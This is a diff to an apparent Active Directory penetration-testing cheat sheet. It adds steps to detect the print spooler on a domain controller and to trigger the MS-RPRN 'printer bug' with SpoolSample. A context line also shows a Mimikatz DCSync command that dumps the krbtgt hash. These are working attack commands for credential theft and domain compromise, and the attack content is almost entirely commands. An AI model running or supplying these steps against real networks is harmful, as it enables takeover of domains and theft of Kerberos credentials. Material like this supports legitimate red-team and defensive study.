@@ -250,7 +250,19 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
 - A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to connect to second a machine of the domain user's choice.
 - A way to force a TGT of DC on the target machine
 - https://github.com/leechristensen/SpoolSample
+#### Check if spool server is running
+```
+#Edit IP at the bottom
+spoolerscan.ps1
+```
 
+```
+ls \\<DC>\pipe\spoolss
+```
+
+
+
+#### Attack
 ```
 .\MS-RPRN.exe \\<DC NAME> \\<TARGET SERVER WITH DELEGATION>
 ```
